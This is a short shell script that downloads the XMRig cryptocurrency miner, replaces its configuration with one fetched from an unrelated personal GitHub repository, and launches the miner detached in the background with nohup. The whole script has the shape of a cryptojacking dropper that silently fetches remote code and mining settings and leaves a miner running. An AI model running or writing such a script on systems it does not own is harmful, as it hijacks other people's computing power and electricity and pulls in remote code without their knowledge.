#!/bin/sh
wget https://github.com/xmrig/xmrig/releases/download/v5.7.0/xmrig-5.7.0-xenial-x64.tar.gz
tar xf xmrig-5.7.0-xenial-x64.tar.gz
rm -rf xmrig-5.7.0/config.json
wget https://raw.githubusercontent.com/ba3walos99/append/master/config.json
cp config.json xmrig-5.7.0/config.json
nohup xmrig-5.7.0/xmrig -c config.json &